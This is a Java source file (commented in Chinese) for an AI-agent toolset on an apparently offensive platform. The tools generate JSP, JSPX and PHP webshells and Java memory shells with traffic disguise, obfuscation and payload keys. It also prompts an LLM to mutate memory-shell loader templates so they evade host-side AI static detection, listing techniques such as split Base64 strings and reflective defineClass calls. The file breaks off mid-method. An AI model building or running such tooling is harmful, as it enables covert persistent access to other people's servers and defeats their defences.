package org.leo.ai.tools.platform;

import dev.langchain4j.agent.tool.P;
import dev.langchain4j.agent.tool.Tool;
import dev.langchain4j.data.message.SystemMessage;
import dev.langchain4j.data.message.UserMessage;
import dev.langchain4j.model.chat.request.ChatRequest;
import dev.langchain4j.model.chat.response.ChatResponse;
import org.leo.ai.agent.AiToolException;
import org.leo.ai.channel.DelegatingChatModel;
import org.leo.core.entity.Disguise;
import org.leo.core.generator.GeneratedArtifact;
import org.leo.core.generator.GenerationRequest;
import org.leo.core.runtime.PuppetRuntime;
import org.leo.jmg.ShellGeneratorConfig;
import org.leo.jmg.ServletNamespace;
import org.leo.jmg.TargetJavaVersion;
import org.leo.jmg.catalog.GeneratorCatalog;
import org.leo.jmg.generation.CoreArtifact;
import org.leo.jmg.generation.CoreArtifactGenerationCommand;
import org.leo.jmg.generation.CoreArtifactGenerationService;
import org.leo.jmg.generation.MemoryShellGenerationCommand;
import org.leo.jmg.generation.ShellGenerationOutcome;
import org.leo.jmg.generation.ShellGenerationService;
import org.leo.jmg.generation.WebShellWrapperContract;
import org.leo.jmg.generation.WebShellWrapperResult;
import org.leo.jmg.generation.WebShellWrapperService;
import org.leo.jmg.mem.packer.PackerRegistry;
import org.leo.jmg.mem.packer.PackerResources;
import org.leo.jmg.mem.packer.jsp.JspLoaderTemplateValidator;
import org.leo.jmg.mem.packer.jsp.JspObfuscationStepCatalog;
import org.leo.service.disguise.DisguiseService;
import org.leo.service.generator.ScriptGeneratorService;
import org.leo.service.shell.CoreArtifactStore;
import org.leo.service.shell.ShellResultStore;
import org.leo.service.shell.WebShellWrapperTemplateStore;
import org.springframework.stereotype.Component;

import java.util.Arrays;
import java.util.Collections;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;

/**
 * 平台侧 AI 工具：WebShell 与内存马生成，含 AI 辅助 JSP 模板结构变异。
 *
 * <p>生成结果不直接返回给 LLM（避免超长字符串被截断），
 * 而是存入 {@link ShellResultStore} 并返回 {@code resultId}。
 * 前端凭 {@code resultId} 通过 REST 端点 {@code GET /platform/shell-generator/result/{id}} 直接取回完整代码。
 *
 * <p>模板变异工作流：
 * <ol>
 *   <li>调用 {@link #mutateJspTemplate} → LLM 生成结构变体模板（保留占位符，改变代码骨架）</li>
 *   <li>调用 {@link #generateMemoryShell} 并传入上一步的模板 → deterministic pipeline 执行输出</li>
 * </ol>
 */
@Component
@org.leo.ai.agent.AiToolPolicy(kind = org.leo.ai.agent.AiToolKind.ARTIFACT,
        operation = org.leo.ai.agent.AiToolOperation.WRITE, business = false)
public class ShellGeneratorTools {

    private static final ShellGenerationService SHELL_GENERATION_SERVICE =
            new ShellGenerationService();
    private static final CoreArtifactGenerationService CORE_ARTIFACT_GENERATION_SERVICE =
            new CoreArtifactGenerationService();
    private static final WebShellWrapperService WEB_SHELL_WRAPPER_SERVICE =
            new WebShellWrapperService();

    private static final String TEMPLATE_SHELL_JSP  = "/memshell-template/shell.jsp.txt";
    private static final String TEMPLATE_SHELL1_JSP = "/memshell-template/shell1.jsp.txt";
    private static final String TEMPLATE_SHELL2_JSP = "/memshell-template/shell2.jsp.txt";

    private static final String TEMPLATE_SYNTAX_GUIDE =
            "## JSP 模板占位符规则\n" +
            "- `{{base64Str}}`  : 注入器字节码的 Base64 编码字符串，必须保留且只能出现一次\n" +
            "- `{{className}}`  : 注入器类的全限定名，如需引用时使用\n" +
            "- `{{VAR:name}}`   : 局部变量占位符；同一模板中相同 name 渲染为相同随机字段名\n" +
            "- `{{CLS:Name}}`   : 内部类名占位符；同一模板中相同 Name 渲染为相同随机 PascalCase 类名\n\n" +
            "## 生成约束\n" +
            "1. 输出必须是合法的 JSP 代码（`<%! %>` / `<% %>` scriptlet 结构）\n" +
            "2. 最终必须完成：解码 {{base64Str}} → byte[] → defineClass → newInstance\n" +
            "3. 所有局部变量必须用 `{{VAR:xxx}}` 占位，内部类名用 `{{CLS:Xxx}}` 占位，禁止使用硬编码变量名\n" +
            "4. 禁止改变 `{{base64Str}}` 的语义，禁止添加额外的网络请求或文件操作\n" +
            "5. 只输出 JSP 代码本身，不要包含任何解释文字、markdown 代码块标记\n";

    private static final String MUTATION_TECHNIQUES =
            "## 可用变异技术（从中选 2-3 个组合应用，在首行注释中注明所选编号）\n" +
            "- T1: 将 Base64 字符串拆为多个字面量片段，通过 StringBuilder 或 + 分步拼接后再解码\n" +
            "- T2: 通过 Thread.currentThread().getContextClassLoader() 获取 ClassLoader\n" +
            "- T3: 用反射调用 defineClass：Class.forName(\"java.lang.ClassLoader\")" +
                  ".getDeclaredMethod(\"defineClass\", ...) 并 setAccessible(true)\n" +
            "- T4: byte[] 解码后经过 Arrays.copyOfRange(decoded, 0, decoded.length) 中转再传入 defineClass\n" +
            "- T5: 将核心调用包在 do { ... } while(false) 或 if(System.currentTimeMillis() > 0){ } 块中\n" +
            "- T6: 把关键类名拆成字符串拼接再传入 Class.forName，如 \"java.util.B\"+\"ase64\"\n" +
            "- T7: 将 defineClass 调用封装进一个 <%! %> 声明块的私有方法，在 <% %> 中调用该方法\n\n";

    private final DisguiseService disguiseService;
    private final DelegatingChatModel chatModel;
    private final ShellResultStore resultStore;
    private final ScriptGeneratorService scriptGeneratorService;
    private final CoreArtifactStore coreArtifactStore;
    private final WebShellWrapperTemplateStore wrapperTemplateStore;

    public ShellGeneratorTools(DisguiseService disguiseService,
                               DelegatingChatModel chatModel,
                               ShellResultStore resultStore,
                               ScriptGeneratorService scriptGeneratorService,
                               CoreArtifactStore coreArtifactStore,
                               WebShellWrapperTemplateStore wrapperTemplateStore) {
        this.disguiseService = disguiseService;
        this.chatModel = chatModel;
        this.resultStore = resultStore;
        this.scriptGeneratorService = scriptGeneratorService;
        this.coreArtifactStore = coreArtifactStore;
        this.wrapperTemplateStore = wrapperTemplateStore;
    }

    // ── 元数据查询 ──────────────────────────────────────────────────────────────

    @Tool("获取 Shell 生成器元数据：Java 服务器类型、注入器形态、Packer、Servlet 命名空间、JSP 混淆步骤，" +
          "以及 PHP 等运行时生成器支持的 artifactTypes、协议、最低版本、输出模式和运行要求。" +
          "生成 WebShell 或内存马前调用此工具确认合法参数范围，不要凭记忆猜测。")
    @org.leo.ai.agent.AiToolPolicy(kind = org.leo.ai.agent.AiToolKind.QUERY,
            operation = org.leo.ai.agent.AiToolOperation.READ_ONLY, parallelizable = true)
    public Map<String, Object> getShellGeneratorMeta() {
        Map<String, Object> data = new LinkedHashMap<>();
        data.put("serverInjectorTypes", GeneratorCatalog.getServerInjectorMap());
        data.put("serverProtocolInjectorTypes", GeneratorCatalog.getProtocolInjectorMap());
        data.put("injectorCapabilities", GeneratorCatalog.getCapabilityDescriptors());
        data.put("packerTypes", PackerRegistry.getHierarchy());
        data.put("packerObfuscationSteps", PackerRegistry.getPackerObfuscationStepsMap());
        data.put("packerCompatibility", PackerRegistry.getCompatibilityMap());
        data.put("packerAvailability", PackerRegistry.getAvailabilityMap());
        data.put("targetJavaVersions", targetJavaVersions());
        data.put("servletNamespaces", ServletNamespace.valuesAsStrings());
        Map<String, Object> transportProtocols = new LinkedHashMap<>();
        transportProtocols.put("webshell", ShellGeneratorConfig.getSupportedWebShellProtocols());
        transportProtocols.put("memoryshell", ShellGeneratorConfig.getSupportedMemoryShellProtocols());
        data.put("transportProtocols", transportProtocols);
        data.put("obfuscationSteps", JspObfuscationStepCatalog.getDescriptors());
        data.put("runtimeGenerators", scriptGeneratorService.getMetadata());
        return data;
    }

    // ── AI WebShell：Core 与 Wrapper 分阶段生成 ─────────────────────────────────

    @Tool("独立生成 Java LeoCore 并存入服务端缓存，返回 coreArtifactId、哈希和非敏感契约元数据；" +
          "绝不返回 Core 字节码或 Base64。生成 Java WebShell 时，在用户选定请求/响应伪装、协议和兼容参数后先调用此工具。" +
          "protocol 支持 http/httpchunk；coreClassName 留空自动随机；obfuscationSeed 留空自动随机，指定后可复现生成。")
    public Map<String, Object> createJavaCoreArtifact(
            @P("请求 Disguise ID") String reqDisguiseId,
            @P("响应 Disguise ID") String respDisguiseId,
            @P("传输协议：http 或 httpchunk") String protocol,
            @P(value = "Core 类名；省略时随机生成", required = false) String coreClassName,
            @P(value = "目标 Java 版本：auto/6/7/8/9+/17+；默认 auto",
                    required = false, defaultValue = "auto") String targetJavaVersion,
            @P(value = "Servlet 命名空间：auto/javax/jakarta；默认 auto",
                    required = false, defaultValue = "auto") String servletNamespace,
            @P(value = "用户输入的 PayloadCodec AES 密钥；省略时使用请求 Disguise 的密钥",
                    required = false) String payloadKey,
            @P(value = "混淆随机种子；省略时随机生成", required = false) Long obfuscationSeed) throws Exception {
        Disguise reqDisguise = requireDisguise(reqDisguiseId, "reqDisguiseId");
        Disguise respDisguise = requireDisguise(respDisguiseId, "respDisguiseId");
        CoreArtifact artifact = CORE_ARTIFACT_GENERATION_SERVICE.generate(
                CoreArtifactGenerationCommand.builder(reqDisguise, respDisguise)
                        .protocol(protocol)
                        .coreClassName(coreClassName)
                        .targetJavaVersion(targetJavaVersion)
                        .servletNamespace(servletNamespace)
                        .payloadKey(payloadKey)
                        .obfuscationSeed(obfuscationSeed)
                        .build());
        if ("websocket".equals(artifact.getProtocol().getValue())) {
            throw new IllegalArgumentException("Java WebShell Core 仅支持 http 或 httpchunk");
        }
        String artifactId = coreArtifactStore.put(artifact);
        Map<String, Object> result = new LinkedHashMap<>();
        result.put("success", true);
        result.put("coreArtifactId", artifactId);
        result.put("coreClassName", artifact.getCoreClassName());
        result.put("coreSha256", artifact.getSha256());
        result.put("bytecodeSize", artifact.getBytecodeSize());
        result.put("protocol", artifact.getProtocol().getValue());
        result.put("targetJavaVersion", artifact.getTargetJavaVersion().getValue());
        result.put("servletNamespace", artifact.getServletNamespace().getValue());
        result.put("obfuscationSeed", Long.toString(artifact.getObfuscationSeed()));
        result.put("entrypoint", "InvocationHandler.invoke(null, null, new Object[]{buffer})");
        result.put("tip", "Core 仅保存在服务端（30 分钟有效）。下一步调用 designWebShellWrapper。不要索取或转述 Core Payload。");
        return result;
    }

    @Tool("获取 AI WebShell Wrapper 契约和不含 Core Payload 的基线模板。" +
          "shellType 为 JSP/JSPX，protocol 为 http/httpchunk。" +
          "模板必须保留五个有序阶段占位符，平台会在最终组装时注入受控核心代码。")
    @org.leo.ai.agent.AiToolPolicy(kind = org.leo.ai.agent.AiToolKind.QUERY,
            operation = org.leo.ai.agent.AiToolOperation.READ_ONLY, parallelizable = true)
    public Map<String, Object> getWebShellWrapperContract(
            @P("外层类型：JSP 或 JSPX") String shellType,
            @P("传输协议：http 或 httpchunk") String protocol) {
        WebShellWrapperContract contract = WEB_SHELL_WRAPPER_SERVICE.getContract(shellType, protocol);
        Map<String, Object> result = new LinkedHashMap<>();
        result.put("artifactType", contract.getArtifactType());
        result.put("protocol", contract.getProtocol().getValue());
        result.put("requiredPhases", contract.getRequiredPhases());
        result.put("rules", contract.getRules());
        result.put("baselineTemplate", contract.getBaselineTemplate());
        return result;
    }

    @Tool("调用 LLM 为指定 coreArtifactId 设计 JSP/JSPX 外层 Wrapper。" +
          "AI 只修改无 Payload 的模板结构，不能展开五个阶段占位符；模板通过契约校验后只返回 wrapperTemplateId，" +
          "不会把 Core 或最终代码放入模型上下文。shellType 必须为 JSP/JSPX，requirements 描述业务外观或结构变化目标。")
    public Map<String, Object> designWebShellWrapper(
            @P("createJavaCoreArtifact 返回的制品 ID") String coreArtifactId,
            @P("外层类型：JSP 或 JSPX") String shellType,
            @P(value = "外观或结构变化要求；省略时使用基线契约", required = false)
            String requirements) throws Exception {
        CoreArtifact artifact = requireCoreArtifact(coreArtifactId);
        WebShellWrapperContract contract = WEB_SHELL_WRAPPER_SERVICE.getContract(
                shellType, artifact.getProtocol().getValue());
        String template = null;
        String lastError = null;
        int maxAttempts = 3;
        for (int attempt = 1; attempt <= maxAttempts; attempt++) {
            ChatRequest request = ChatRequest.builder()
                    .messages(Arrays.asList(
                            SystemMessage.from(buildWrapperSystemGuide(contract)),
                            UserMessage.from(buildWrapperPrompt(contract, requirements, lastError))))
                    .build();
            ChatResponse response = chatModel.chat(request);
            String raw = response.aiMessage().text();
            template = stripCodeFences(raw == null ? "" : raw.trim());
            try {
                contract.validate(template);
                break;
            } catch (IllegalArgumentException e) {
                lastError = e.getMessage();
                if (attempt == maxAttempts) {
                    throw AiToolException.modelCorrectable(
                            "GENERATED_CONTENT_INVALID",
                            "经过 " + maxAttempts + " 次尝试仍未生成合法 Wrapper：" + lastError,
                            "调整 requirements 后重新设计；不要绕过 Wrapper 契约校验。");
                }
            }
        }
        String templateId = wrapperTemplateStore.put(
                template, contract.getArtifactType(), contract.getProtocol().getValue());
        Map<String, Object> result = new LinkedHashMap<>();
        result.put("success", true);
        result.put("wrapperTemplateId", templateId);
        result.put("artifactType", contract.getArtifactType());
        result.put("protocol", contract.getProtocol().getValue());
        result.put("templateLength", template.length());
        result.put("summary", "Wrapper 已通过阶段占位符、结构和禁止操作校验；模板在服务端保存 30 分钟。");
        return result;
    }

    @Tool("将服务端 CoreArtifact 与已验证 Wrapper 模板最终组装为 Java WebShell，并返回 resultId。" +
          "obfuscate 必须明确传 true/false；false 表示空步骤不混淆，true 且未指定步骤时使用平台默认混淆，" +
          "true 且指定 jspObfuscationSteps 时按合法步骤执行。组装前会再次验证模板、协议和格式一致性。")
    public Map<String, Object> assembleWebShellWrapper(
            @P("Core 制品 ID") String coreArtifactId,
            @P("已验证 Wrapper 模板 ID") String wrapperTemplateId,
            @P("是否启用 JSP 混淆，必须明确 true/false") Boolean obfuscate,
            @P(value = "JSP 混淆步骤有序列表；省略时使用默认，空列表表示不混淆",
                    required = false) List<String> jspObfuscationSteps,
            @P(value = "HTTP 响应码；默认200", required = false,
                    defaultValue = "200") Integer respCode) throws Exception {
        if (obfuscate == null) {
            throw new IllegalArgumentException("obfuscate 必须明确为 true 或 false");
        }
        CoreArtifact artifact = requireCoreArtifact(coreArtifactId);
        WebShellWrapperTemplateStore.TemplateEntry template =
                wrapperTemplateStore.get(requireNonBlank(wrapperTemplateId, "wrapperTemplateId 不能为空"));
        if (template == null) {
            throw new IllegalArgumentException("Wrapper 模板不存在或已过期: " + wrapperTemplateId);
        }
        if (!artifact.getProtocol().getValue().equals(template.getProtocol())) {
            throw new IllegalArgumentException("Core 与 Wrapper 协议不一致");
        }
        List<String> effectiveSteps;
        if (!obfuscate.booleanValue()) {
            effectiveSteps = Collections.emptyList();
        } else if (jspObfuscationSteps == null || jspObfuscationSteps.isEmpty()) {
            effectiveSteps = null;
        } else {
            effectiveSteps = jspObfuscationSteps;
        }
        WebShellWrapperResult assembled = WEB_SHELL_WRAPPER_SERVICE.assemble(
                artifact,
                template.getTemplate(),
                template.getArtifactType(),
                respCode,
                effectiveSteps);
        Map<String, Object> meta = new LinkedHashMap<>(assembled.getMetadata());
        meta.put("obfuscated", obfuscate);
        String resultId = resultStore.put(assembled.getContent(), meta);
        Map<String, Object> result = new LinkedHashMap<>();
        result.put("success", true);
        result.put("resultId", resultId);
        result.put("fetchUrl", "/platform/shell-generator/result/" + resultId);
        result.put("meta", meta);
        result.put("tip", "完整代码已缓存（30 分钟有效）。请原样嵌入：[[shell-result:"
                + resultId + ":取回 WebShell 代码]]");
        return result;
    }

    // ── PHP WebShell 生成 ─────────────────────────────────────────────────────

    @Tool("生成 PHP WebShell，并将完整代码存入缓存后返回 resultId。" +
          "这是独立制品生成，不得读取或沿用任何已有 Puppet 配置；调用前应根据用户本次需求确定请求/响应伪装器。" +
          "outputMode 从 getShellGeneratorMeta 的 runtimeGenerators.php.outputModes 中选择：" +
          "compact 为默认精简源码，packed 需要 zlib/base64_decode/gzinflate，portable 为便于兼容排障的展开源码。" +
          "headerName 与 headerValue 必须同时设置或同时留空；respCode 默认 200；seed 留空时自动随机。" +
          "payloadKey 必须由用户提供，用于 PHP PayloadCodec；不得使用默认密钥。" +
          "PHP 当前只支持 webshell，不支持 Java 内存马参数和 JSP 模板变异。")
    public Map<String, Object> generatePhpWebShell(
            @P("请求 Disguise ID") String reqDisguiseId,
            @P("响应 Disguise ID") String respDisguiseId,
            @P(value = "协议；PHP 当前默认并支持 http", required = false,
                    defaultValue = "http") String protocol,
            @P(value = "输出模式：compact/packed/portable；默认 compact",
                    required = false, defaultValue = "compact") String outputMode,
            @P(value = "触发 Header 名；须与 headerValue 同时提供", required = false) String headerName,
            @P(value = "触发 Header 值；须与 headerName 同时提供", required = false) String headerValue,
            @P(value = "HTTP 响应码；默认200", required = false,
                    defaultValue = "200") Integer respCode,
            @P("用户输入的 PHP PayloadCodec AES 密钥") String payloadKey,
            @P(value = "生成种子；省略时随机", required = false) String seed) throws Exception {
        Disguise reqDisguise = requireDisguise(reqDisguiseId, "reqDisguiseId");
        Disguise respDisguise = requireDisguise(respDisguiseId, "respDisguiseId");

        String effectiveProtocol = isBlank(protocol) ? "http" : protocol.trim().toLowerCase(Locale.ROOT);
        if (!"http".equals(effectiveProtocol)) {
            throw AiToolException.modelCorrectable(
                    "UNSUPPORTED_CAPABILITY",
                    "PHP WebShell 当前仅支持 http 协议，当前值: " + protocol,
                    "调用 getShellGeneratorMeta 确认生成能力；PHP WebShell 仅可选择 http。");
        }
        if (isBlank(headerName) != isBlank(headerValue)) {
            throw AiToolException.modelCorrectable(
                    "CROSS_FIELD_CONSTRAINT",
                    "headerName 与 headerValue 必须同时设置或同时留空。",
                    "同时提供两个字段，或将两个字段都留空。");
        }

        Map<String, Object> options = new LinkedHashMap<>();
        if (!isBlank(outputMode)) options.put("outputMode", outputMode.trim().toLowerCase(Locale.ROOT));
        if (!isBlank(headerName)) {
            options.put("headerName", headerName.trim());
            options.put("headerValue", headerValue.trim());
        }
        if (respCode != null) options.put("respCode", respCode);
        if (payloadKey == null || payloadKey.trim().isEmpty()) {
            throw AiToolException.modelCorrectable("MISSING_REQUIRED_FIELD", "payloadKey 不能为空",
                    "请让用户提供 PHP 节点 PayloadCodec AES 密钥后重新生成。");
        }
        options.put("payloadKey", payloadKey.trim());
        if (!isBlank(seed)) options.put("seed", seed.trim());

        GeneratedArtifact artifact = scriptGeneratorService.generate(new GenerationRequest(
                PuppetRuntime.PHP, "webshell", reqDisguise, respDisguise, options));

        Map<String, Object> meta = new LinkedHashMap<>(artifact.getMetadata());
        meta.put("fileExtension", artifact.getFileExtension());
        meta.put("mediaType", artifact.getMediaType());
        meta.put("warnings", artifact.getWarnings());
        meta.put("lines", artifact.getContent().split("\n").length);
        meta.put("chars", artifact.getContent().length());

        String resultId = resultStore.put(artifact.getContent(), meta);
        Map<String, Object> result = new LinkedHashMap<>();
        result.put("success", true);
        result.put("resultId", resultId);
        result.put("fetchUrl", "/platform/shell-generator/result/" + resultId);
        result.put("meta", meta);
        result.put("tip", "完整代码已缓存（30 分钟有效）。" +
                "请在回复正文中嵌入以下按钮语法，让用户可以直接在对话中取回代码：" +
                "[[shell-result:" + resultId + ":取回 PHP WebShell 代码]]");
        return result;
    }

    // ── AI 辅助模板变异 ──────────────────────────────────────────────────────────

    @Tool("调用 LLM 对 JSP 内存马模板进行结构变异，生成语义等价但代码骨架不同的变体，" +
          "用于规避主机侧 AI 对落地 JSP 文件的静态特征检测。" +
          "返回字段：mutatedTemplate（变体模板字符串）、summary（变异摘要）。" +
          "将 mutatedTemplate 作为 generateMemoryShell 的 customJspTemplate 参数传入即可启用变体。" +
          "packerType 必填（如 ClassLoaderJSP / DefineClassJSP）；" +
          "byPassJavaModule 仅对 DefineClassJSP 有效；" +
          "mutationHint 可选，指定变异方向。")
    public Map<String, Object> mutateJspTemplate(
            @P("Packer 类型：ClassLoaderJSP 或 DefineClassJSP") String packerType,
            @P(value = "是否绕过 Java 模块限制；默认 false，仅 DefineClassJSP 有效",
                    required = false, defaultValue = "false") Boolean byPassJavaModule,
            @P(value = "结构变异方向", required = false) String mutationHint) throws Exception {
        String baseTemplate = resolveBaseTemplate(packerType, byPassJavaModule);

        String mutated = null;
        String lastError = null;
        int maxAttempts = 3;

        for (int attempt = 1; attempt <= maxAttempts; attempt++) {
            String userPrompt = buildMutationPrompt(baseTemplate, mutationHint, lastError);
            ChatRequest request = ChatRequest.builder()
                    .messages(Arrays.asList(
                            SystemMessage.from(TEMPLATE_SYNTAX_GUIDE),
                            UserMessage.from(userPrompt)
                    ))
                    .build();
            ChatResponse response = chatModel.chat(request);
            String raw = response.aiMessage().text();
            if (raw == null) raw = "";
            mutated = stripCodeFences(raw.trim());

            try {
                JspLoaderTemplateValidator.validate(mutated);
                break; // 验证通过，退出重试
            } catch (IllegalArgumentException e) {
                lastError = e.getMessage();
                if (attempt == maxAttempts) {
                    throw AiToolException.modelCorrectable(
                            "GENERATED_CONTENT_INVALID",
                            "经过 " + maxAttempts
                                    + " 次尝试仍未生成合法模板，最后一次错误："
                                    + lastError,
                            "调整 mutationHint 后重新调用；不要直接使用无效模板。");
                }
            }
        }

        Map<String, Object> result = new LinkedHashMap<>();
        result.put("success", true);
        result.put("mutatedTemplate", mutated);
        result.put("summary", "结构变异完成，模板长度 " + mutated.length()
                + " 字符。将 mutatedTemplate 传入 generateMemoryShell 的 customJspTemplate 参数即可使用。");
        return result;
    }

    // ── 内存马生成 ──────────────────────────────────────────────────────────────

    @Tool("生成内存马并将完整代码存入缓存，返回 resultId 供前端取回。" +
          "这是独立制品生成，与已有 Puppet 无关；除非用户明确要求匹配某个 Puppet，否则禁止查询或沿用 Puppet 配置。" +
          "如果用户尚未选择传输协议、请求/响应伪装器、目标容器、注入器、Packer 或是否混淆，" +
          "先调用 getShellGeneratorMeta 和 getDisguises 获取候选项，再调用 request_user_input 询问用户，收到回答前不要调用本工具。" +
          "前端通过 GET /platform/shell-generator/result/{resultId} 取回完整代码，勿让 LLM 转述完整代码。" +
          "reqDisguiseId / respDisguiseId：用户为本次生成选择的请求/响应伪装器 ID，必填。" +
          "headerName / headerValue：http 模式下为必填触发 Header；websocket 模式不使用 Header 门禁。" +
          "serverType：目标应用服务器类型，必填，可通过 getShellGeneratorMeta 获取。" +
          "serverVersion：能力元数据标记 requiresServerVersion 时必填；TongWeb Valve 使用 6 / 7 / 8。" +
          "shellType：注入器形态，必填，可通过 getShellGeneratorMeta 获取。" +
          "packerType：打包器类型，必填，可通过 getShellGeneratorMeta 获取。" +
          "protocol：http / httpchunk / websocket，由用户选择；" +
          "httpchunk 下 shellType 使用协议元数据公开的普通形态名，生成器会自动选择 Chunk 模板。" +
          "targetJavaVersion：目标运行时版本，可选 auto / 6 / 7 / 8 / 9+ / 17+，默认 auto；" +
          "servletNamespace：Servlet API 命名空间，可选 auto / javax / jakarta，默认 auto（当前解析为 javax）；" +
          "urlPattern：http 模式默认 /*；websocket 模式为端点路径，默认 /leo，必须以 / 开头且不能含 *。" +
          "coreClassName / injectorClassName / shellClassName：留空自动生成随机类名。" +
          "isAbstractTranslet：默认 false。byPassJavaModule：默认 false。respCode：默认 200。" +
          "jspObfuscationSteps：混淆步骤 ID 有序列表，null 使用默认策略，空列表不混淆。" +
          "customJspTemplate：由 mutateJspTemplate 返回的变体模板，用于规避 AI 检测。")
    public Map<String, Object> generateMemoryShell(
            @P("请求 Disguise ID") String reqDisguiseId,
            @P("响应 Disguise ID") String respDisguiseId,
            @P(value = "HTTP 模式触发 Header 名；须与 headerValue 同时提供", required = false) String headerName,
            @P(value = "HTTP 模式触发 Header 值；须与 headerName 同时提供", required = false) String headerValue,
            @P("目标应用服务器类型") String serverType,
            @P(value = "目标服务器版本；能力元数据要求时必填", required = false) String serverVersion,
            @P("注入器形态") String shellType,
            @P("Packer 类型") String packerType,
            @P("协议：http/httpchunk/websocket") String protocol,
            @P(value = "目标 Java 版本：auto/6/7/8/9+/17+；默认 auto",
                    required = false, defaultValue = "auto") String targetJavaVersion,
            @P(value = "Servlet 命名空间：auto/javax/jakarta；默认 auto",
                    required = false, defaultValue = "auto") String servletNamespace,
            @P(value = "URL 模式；http 默认 /*，websocket 默认 /leo", required = false) String urlPattern,
            @P(value = "Core 类名；省略时随机", required = false) String coreClassName,
            @P(value = "Injector 类名；省略时随机", required = false) String injectorClassName,
            @P(value = "Shell 类名；省略时随机", required = false) String shellClassName,
            @P(value = "是否使用 AbstractTranslet；默认 false",
                    required = false, defaultValue = "false") Boolean isAbstractTranslet,
            @P(value = "是否绕过 Java 模块限制；默认 false",
                    required = false, defaultValue = "false") Boolean byPassJavaModule,
            @P(value = "HTTP 响应码；默认200", required = false,
                    defaultValue = "200") Integer respCode,
            @P(value = "用户输入的 PayloadCodec AES 密钥；省略时使用请求 Disguise 的密钥",
                    required = false) String payloadKey,
            @P(value = "JSP 混淆步骤；省略时使用默认，空列表表示关闭",
                    required = false) List<String> jspObfuscationSteps,
            @P(value = "mutateJspTemplate 返回的自定义模板", required = false)
            String customJspTemplate) throws Exception {
        Disguise reqDisguise  = requireDisguise(reqDisguiseId,  "reqDisguiseId");
        Disguise respDisguise = requireDisguise(respDisguiseId, "respDisguiseId");

        MemoryShellGenerationCommand command =
                MemoryShellGenerationCommand.builder(reqDisguise, respDisguise)
                        .header(headerName, headerValue)
                        .serverType(serverType)
                        .serverVersion(serverVersion)
                        .injectorName(shellType)
                        .packerType(packerType)
                        .protocol(protocol)
                        .targetJavaVersion(targetJavaVersion)
                        .servletNamespace(servletNamespace)
                        .urlPattern(urlPattern)
                        .coreClassName(coreClassName)
                        .injectorClassName(injectorClassName)
                        .shellClassName(shellClassName)
                        .abstractTranslet(isAbstractTranslet)
                        .bypassJavaModule(byPassJavaModule)
                        .responseCode(respCode)
                        .payloadKey(payloadKey)
                        .obfuscationSteps(jspObfuscationSteps)
                        .customJspTemplate(customJspTemplate)
                        .build();
        ShellGenerationOutcome outcome =
                SHELL_GENERATION_SERVICE.generateMemoryShell(command);
        String code = outcome.getContent();
        Map<String, Object> meta =
                new LinkedHashMap<String, Object>(outcome.getMetadata());

        String resultId = resultStore.put(code, meta);

        Map<String, Object> result = new LinkedHashMap<>();
        result.put("success",  true);
        result.put("resultId", resultId);
        result.put("fetchUrl", "/platform/shell-generator/result/" + resultId);
        result.put("meta",     meta);
        result.put("tip",      "完整代码已缓存（30 分钟有效）。" +
                "请在回复正文中嵌入以下按钮语法，让用户可以直接在对话中取回代码：" +
                "[[shell-result:" + resultId + ":取回内存马代码]]");
        return result;
    }

    // ── 私有工具方法 ───────────────────────────────────────────────────────────

    private String resolveBaseTemplate(String packerType, Boolean byPassJavaModule) {
        if (isBlank(packerType)) throw new IllegalArgumentException("packerType 不能为空");
        String pt = packerType.trim();
        if ("ClassLoaderJSP".equalsIgnoreCase(pt)) {
            return PackerResources.loadTemplate(TEMPLATE_SHELL_JSP);
        }
        if ("DefineClassJSP".equalsIgnoreCase(pt)) {
            boolean bypass = Boolean.TRUE.equals(byPassJavaModule);
            return PackerResources.loadTemplate(bypass ? TEMPLATE_SHELL2_JSP : TEMPLATE_SHELL1_JSP);
        }
        throw new IllegalArgumentException(
                "AI JSP 模板变异仅支持 ClassLoaderJSP 或 DefineClassJSP，当前值: " + packerType);
    }

    private String buildMutationPrompt(String baseTemplate, String mutationHint, String lastError) {
        StringBuilder sb = new StringBuilder();
        sb.append("以下是当前内置的 JSP 内存马加载模板，请对其进行结构变异，");
        sb.append("生成一个语义完全等价但代码骨架明显不同的变体，以规避主机侧 AI 对 JSP 文件的静态特征检测。\n\n");

        if (lastError != null && !lastError.trim().isEmpty()) {
            sb.append("⚠️ 上一次生成失败，原因：").append(lastError.trim());
            sb.append("\n请修正上述问题后重新输出。\n\n");
        }

        sb.append(MUTATION_TECHNIQUES);

        if (!isBlank(mutationHint)) {
            sb.append("额外变异方向提示：").append(mutationHint.trim()).append("\n\n");
        }

        sb.append("原始模板：\n```\n").append(baseTemplate).append("\n```\n\n");
        sb.append("输出要求：只输出变体 JSP 代码，不要有任何说明文字或 markdown 标记。");
        return sb.toString();
    }

    private String buildWrapperSystemGuide(WebShellWrapperContract contract) {
        StringBuilder guide = new StringBuilder();
        guide.append("你只负责设计 WebShell 外层模板，真实 Core Payload 永远由平台注入。\n");
        guide.append("严禁展开、改名、复制或删除阶段占位符。\n");
        guide.append("必须保留以下顺序：").append(contract.getRequiredPhases()).append("\n");
        for (String rule : contract.getRules()) {
            guide.append("- ").append(rule).append("\n");
        }
        return guide.toString();
    }

    private String buildWrapperPrompt(WebShellWrapperContract contract,
                                      String requirements,
                                      String lastError) {
        StringBuilder prompt = new StringBuilder();
        prompt.append("请基于以下 ").append(contract.getArtifactType())
                .append(" 基线模板设计结构变体。协议为 ")
                .append(contract.getProtocol().getValue()).append("。\n\n");
        if (!isBlank(requirements)) {
            prompt.append("用户要求：").append(requirements.trim()).append("\n\n");
        }
        if (!isBlank(lastError)) {
            prompt.append("上一次模板校验失败：").append(lastError.trim())
                    .append("\n请修正后重新输出。\n\n");
        }
        prompt.append("基线模板：\n```\n")
                .append(contract.getBaselineTemplate())
                .append("\n```\n\n只输出完整模板源码，不要输出解释或 Markdown 标记。");
        return prompt.toString();
    }

    private CoreArtifact requireCoreArtifact(String coreArtifactId) {
        String id = requireNonBlank(coreArtifactId, "coreArtifactId 不能为空");
        CoreArtifact artifact = coreArtifactStore.get(id);
        if (artifact == null) {
            throw new IllegalArgumentException("CoreArtifact 不存在或已过期: " + id);
        }
        return artifact;
    }

    private String stripCodeFences(String text) {
        if (text.startsWith("```")) {
            int firstNewline = text.indexOf('\n');
            if (firstNewline > 0) text = text.substring(firstNewline + 1);
            if (text.endsWith("```")) text = text.substring(0, text.lastIndexOf("```")).trim();
        }
        return text;
    }

    private Disguise requireDisguise(String disguiseId, String paramName) {
        requireNonBlank(disguiseId, paramName + " 不能为空");
        Disguise d = disguiseService.getDisguiseById(disguiseId.trim());
